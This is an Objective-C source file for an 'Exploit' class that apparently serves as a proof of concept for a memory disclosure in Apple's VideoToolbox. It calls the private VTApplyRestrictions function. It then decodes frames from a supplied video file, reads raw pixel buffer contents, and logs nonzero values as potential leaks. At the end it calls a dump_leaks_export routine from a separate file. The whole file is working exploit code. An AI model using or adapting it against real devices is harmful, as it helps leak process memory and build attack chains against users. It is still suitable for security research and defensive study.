#import "Exploit.h"
#import <dlfcn.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreMedia/CMSampleBuffer.h>

typedef void (*t_VTApplyRestrictions)(int arg);
t_VTApplyRestrictions VTApplyRestrictions;

LogCallback logCallback;

void log_message(const char *format, ...) {
    if (logCallback) {
        va_list args;
        va_start(args, format);
        char buffer[1024];
        vsnprintf(buffer, sizeof(buffer), format, args);
        logCallback(buffer);
        va_end(args);
    }
}

@interface Exploit ()

@property (nonatomic, assign) void *toolbox;

@end

@implementation Exploit

- (instancetype)initWithLogCallback:(LogCallback)callback {
    self = [super init];
    if (self) {
        logCallback = callback;
        
        // Load VideoToolbox
        _toolbox = dlopen("/System/Library/Frameworks/VideoToolbox.framework/Versions/A/VideoToolbox", RTLD_NOW);
        if (!_toolbox) {
            log_message("Error loading VideoToolbox");
            return nil;
        }
        
        VTApplyRestrictions = (t_VTApplyRestrictions)dlsym(_toolbox, "VTApplyRestrictions");
        if (!VTApplyRestrictions) {
            log_message("Error finding VTApplyRestrictions");
            dlclose(_toolbox);
            return nil;
        }
        
        VTApplyRestrictions(1);
    }
    return self;
}

- (void)dealloc {
    if (_toolbox) {
        dlclose(_toolbox);
    }
}

- (void)runExploitWithFilePath:(const char *)filePath {
    @autoreleasepool {
        NSError *error = nil;
        NSURL *fileURL = [NSURL fileURLWithPath:[NSString stringWithUTF8String:filePath]];
        AVAsset *asset = [AVAsset assetWithURL:fileURL];
        
        if (asset == nil) {
            log_message("Failed to load asset");
            return;
        }
        
        AVAssetReader *reader = [[AVAssetReader alloc] initWithAsset:asset error:&error];
        if (reader == nil) {
            log_message("Failed to create reader: %s", [[error localizedDescription] UTF8String]);
            return;
        }
        
        NSArray *tracks = [asset tracksWithMediaType:AVMediaTypeVideo];
        if (tracks == nil || [tracks count] == 0) {
            log_message("No video tracks found");
            return;
        }
        
        AVAssetTrack *track = tracks[0];
        NSDictionary *outputSettings = @{
            (id)kCVPixelBufferPixelFormatTypeKey: @(kCMPixelFormat_32BGRA),
            (id)kCVPixelBufferIOSurfacePropertiesKey: @{}
        };
        
        AVAssetReaderTrackOutput *output = [AVAssetReaderTrackOutput 
            assetReaderTrackOutputWithTrack:track 
                            outputSettings:outputSettings];
        
        [reader addOutput:output];
        [reader startReading];
        
        for (int frame = 0; frame < 10; frame++) {
            CMSampleBufferRef sampleBuffer = [output copyNextSampleBuffer];
            if (sampleBuffer == nil) {
                log_message("End of samples at frame %d", frame);
                break;
            }
            
            CVPixelBufferRef pixelBuffer = CMSampleBufferGetImageBuffer(sampleBuffer);
            if (pixelBuffer) {
                CVPixelBufferLockBaseAddress(pixelBuffer, 0);
                void *baseAddress = CVPixelBufferGetBaseAddress(pixelBuffer);
                size_t size = CVPixelBufferGetDataSize(pixelBuffer);
                
                if (baseAddress && size >= sizeof(uint64_t)) {
                    uint64_t first_qword = *(uint64_t*)baseAddress;
                    if (first_qword != 0) {
                        log_message("Potential leak at frame %d: 0x%llx", frame, first_qword);
                    }
                }
                CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
            }
            
            CMSampleBufferInvalidate(sampleBuffer);
            CFRelease(sampleBuffer);
        }
        
        // Call dump_leaks_export from flip.c
        extern void dump_leaks_export(void);
        dump_leaks_export();
    }
}

@end
